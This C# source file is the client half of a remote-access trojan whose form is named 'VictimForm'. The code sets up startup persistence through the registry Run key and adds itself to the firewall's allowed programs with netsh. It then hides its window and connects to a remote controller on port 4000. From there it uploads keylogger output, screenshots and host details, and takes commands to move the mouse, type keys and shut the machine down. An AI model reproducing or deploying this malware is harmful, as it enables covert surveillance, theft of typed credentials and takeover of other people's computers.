using System;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Net.Sockets;
using System.Net;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Runtime.InteropServices;
using Microsoft.Win32;
namespace Victim
{
    public partial class VictimForm : Form
    {
        int iDevice = 0;
        MemoryStream ms;
        BinaryWriter FileBinaryStream;
        FileStream FileStream;
        private int pictureOutWinHandle;
        RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);// Editing registry for Auto-Opening. (path to the key where Windows looks for startup applications)
        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        public static extern void mouse_event(int dwFlags, int dx, int dy, int cButtons, int dwExtraInfo);
        public const int MOUSEEVENTF_LEFTDOWN = 0x02;
        public const int MOUSEEVENTF_LEFTUP = 0x04;
        public const int MOUSEEVENTF_RIGHTDOWN = 0x08;
        public const int MOUSEEVENTF_RIGHTUP = 0x10;
        int x;
        int y;
        static int yahasW = 1;
        static int yahasH = 1;
        public static Socket clientSock;
        Thread reciveThread;
        Thread m;
        string s;
        bool conected = false;
        bool isable = true;
        string look;
        Cproces shutdown;
        Cproces cancel;
        string ipp;
        public VictimForm()
        {
            InitializeComponent();
            VictimFormLoad();
            AI.Init();
            
        }
        public static void sendKey()
        {
            DateTime date = DateTime.Today;
            int dDAY = date.Day;
            int dMONTH = date.Month;
            int dYEAR = date.Year;
            string DATE = dDAY.ToString() + "." + dMONTH.ToString() + "." + dYEAR.ToString();
            upload up = new upload();
            up.startUpload(@"C:\drivers1\key\spy" + DATE + ".txt", clientSock);
        }
        public static string getData()
        {
            try
            {
                byte[] buffer = new byte[1024];
                int receivedDataLength = clientSock.Receive(buffer);
                string stringData = Encoding.ASCII.GetString(buffer, 0, receivedDataLength);
                return stringData;
            }
            catch (SocketException)
            {
                Application.Exit();
                return "";
            }

            catch
            {
                return "";
            }
        }
        public static void sendData(string message)
        {
            clientSock.Send(ASCIIEncoding.ASCII.GetBytes(message));
        }
        public void connect()
        {
            this.Close();
            conected = false;
            isable = true;

            while (conected == false)
            {
                try
                {
                    clientSock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP);
                    IPAddress[] ipAddress = Dns.GetHostAddresses(ipp);
                    IPEndPoint ipEnd = new IPEndPoint(ipAddress[0], 4000);
                    clientSock.Connect(ipEnd);
                }
                catch
                {
                    Thread.Sleep(10);
                    connect();
                }
                finally
                {
                    threadStart();
                    conected = true;
                    this.WindowState = FormWindowState.Minimized;
                    this.Visible = false;

                }
            }
        }
        void threadStart()
        {
            reciveThread = new Thread(new ThreadStart(SendInfo));
            reciveThread.Start();

        }
      
        void SendInfo()
        {
            while ((isable == true) && (clientSock != null))
            {

                string dataFromServer = getData();
                if (dataFromServer == "key")
                    sendKey();

                if (dataFromServer == "GetName")
                {
                    s = SystemInformation.UserName;
                    string strHostName = "";
                    strHostName = Dns.GetHostName();
                    IPHostEntry ipEntry = Dns.GetHostEntry(strHostName);
                    IPAddress[] addr = ipEntry.AddressList;
                    int i = 0;
                    while (addr[i].ToString().Length > 15)
                        i++;
                    strHostName += "#" + addr[i].ToString();

                    sendData(strHostName);
                }
                if (dataFromServer == "pic")
                {
                    Bitmap picture = SaveScreenShot();
                    picture.Save(@"C:\temp\image.Jpeg", ImageFormat.Jpeg);
                    upload up = new upload();
                    up.startUpload(@"C:\temp\image.Jpeg", clientSock);
                    picture.Dispose();
                }
                if ((dataFromServer.Length > 3) && (dataFromServer.Substring(0, 2) == "PB"))
                {
                    string[] mize = dataFromServer.Split('#');

                    Bitmap picture = SaveScreenShot2(int.Parse(mize[1]), int.Parse(mize[2]));
                    picture.Save(@"C:\temp\image.Jpeg", ImageFormat.Jpeg);
                    upload up = new upload();
                    up.startUpload(@"C:\temp\image.Jpeg", clientSock);
                    picture.Dispose();
                }




                if (dataFromServer == "Shutdown")
                {

                    shutdown.kill();
                    //Process.Start("cmd", "/c shutdown -s -t 100");
                }

                if (dataFromServer == "CancelShutdown")
                {

                    cancel.kill();
                }
                if (dataFromServer == "screen")
                {
                    look = SystemInformation.PrimaryMonitorSize.Width.ToString();
                    look += "#";
                    look += SystemInformation.PrimaryMonitorSize.Height.ToString();
                    sendData(look);

                }
                if ((dataFromServer.Length > 3) && (dataFromServer.Substring(0, 2) == "me"))
                {

                    string[] mize = dataFromServer.Split('#');
                    if (int.Parse(mize[3]) == 1)
                    {
                        Cursor.Position = new Point(int.Parse(mize[1]), int.Parse(mize[2]));
                        mouse_event(MOUSEEVENTF_LEFTDOWN, int.Parse(mize[1]) * yahasW, int.Parse(mize[2]) * yahasH, 0, 0);
                        mouse_event(MOUSEEVENTF_LEFTUP, int.Parse(mize[1]) * yahasW, int.Parse(mize[2]) * yahasH, 0, 0);
                    }
                    if (int.Parse(mize[3]) == 2)
                    {
                        Cursor.Position = new Point(int.Parse(mize[1]), int.Parse(mize[2]));
                        mouse_event(MOUSEEVENTF_RIGHTDOWN, int.Parse(mize[1]) * yahasW, int.Parse(mize[2]) * yahasH, 0, 0);
                        mouse_event(MOUSEEVENTF_RIGHTUP, int.Parse(mize[1]) * yahasW, int.Parse(mize[2]) * yahasH, 0, 0);
                    }
                    if (int.Parse(mize[3]) == 3)
                    {
                        Cursor.Position = new Point(int.Parse(mize[1]), int.Parse(mize[2]));
                        mouse_event(MOUSEEVENTF_LEFTDOWN|MOUSEEVENTF_LEFTUP, int.Parse(mize[1]) * yahasW, int.Parse(mize[2]) * yahasH, 0, 0);
                        Thread.Sleep(15);
                        mouse_event(MOUSEEVENTF_LEFTDOWN | MOUSEEVENTF_LEFTUP, int.Parse(mize[1]) * yahasW, int.Parse(mize[2]) * yahasH, 0, 0);
                    }


                }
                if ((dataFromServer.Length > 3) && (dataFromServer.Substring(0, 2) == "ke"))
                {
                    string[] mize = dataFromServer.Split('#');
                    try
                    {

                        SendKeys.SendWait(mize[1]);

                    }
                    catch
                    {
                    }
                }
                if ((dataFromServer.Length > 4) && (dataFromServer.Substring(0, 4) == "Text"))
                {
                    string[] mize = dataFromServer.Split('#');
                    MessageBox.Show(mize[1], mize[2]);
                }
            }
        }
        private static Bitmap SaveScreenShot()
        {
            int screenWidth = Screen.GetBounds(new Point(0, 0)).Width;
            int screenHeight = Screen.GetBounds(new Point(0, 0)).Height;
            Bitmap bmpScreenShot = new Bitmap(screenWidth, screenHeight);
            Graphics gfx = Graphics.FromImage((Image)bmpScreenShot);
            gfx.CopyFromScreen(0, 0, 0, 0, new Size(screenWidth, screenHeight));            
            int nWidth = (int)(bmpScreenShot.Width / 2);
            int nHeight = (int)(bmpScreenShot.Height / 2);
            Bitmap result = new Bitmap(nWidth, nHeight);
            using (Graphics g = Graphics.FromImage((Image)result))
            g.DrawImage(bmpScreenShot, 0, 0, nWidth, nHeight);
            return result;
        }
        private static Bitmap SaveScreenShot2(int a, int b)
        {
         
            int screenWidth2 = Screen.GetBounds(new Point(0, 0)).Width;
            int screenHeight2 = Screen.GetBounds(new Point(0, 0)).Height;
            Bitmap bmpScreenShot2 = new Bitmap(screenWidth2, screenHeight2);
            Graphics gfx2 = Graphics.FromImage((Image)bmpScreenShot2);
            gfx2.CopyFromScreen(0, 0, 0, 0, new Size(screenWidth2, screenHeight2));
            yahasH = SystemInformation.PrimaryMonitorSize.Height / a;
            yahasW = SystemInformation.PrimaryMonitorSize.Width / b;
            if (yahasH == 0)
                yahasH = 1;
            if (yahasW == 0)
                yahasW = 1;
            int nWidth2 = (int)(bmpScreenShot2.Width / (yahasW));
            int nHeight2 = (int)(bmpScreenShot2.Height / (yahasH));
            Bitmap result2 = new Bitmap(nWidth2, nHeight2);
            using (Graphics g2 = Graphics.FromImage((Image)result2))
            g2.DrawImage(bmpScreenShot2, 0, 0, nWidth2, nHeight2);
            return result2;
        }
        private void VictimFormLoad()
        {
            ipp = IP.Text;
            Directory.CreateDirectory(@"C:\temp");
            string b = Application.ExecutablePath;
            string bb = b.Replace(@"\", "/");
            Cproces firewall = new Cproces("netsh firewall set allowedprogram " + '"' + bb + '"' + " victim ENABLE");
            firewall.kill();
            shutdown = new Cproces("shutdown -s -t 100");
            cancel = new Cproces("shutdown -a");
            connect();
        }

}

}



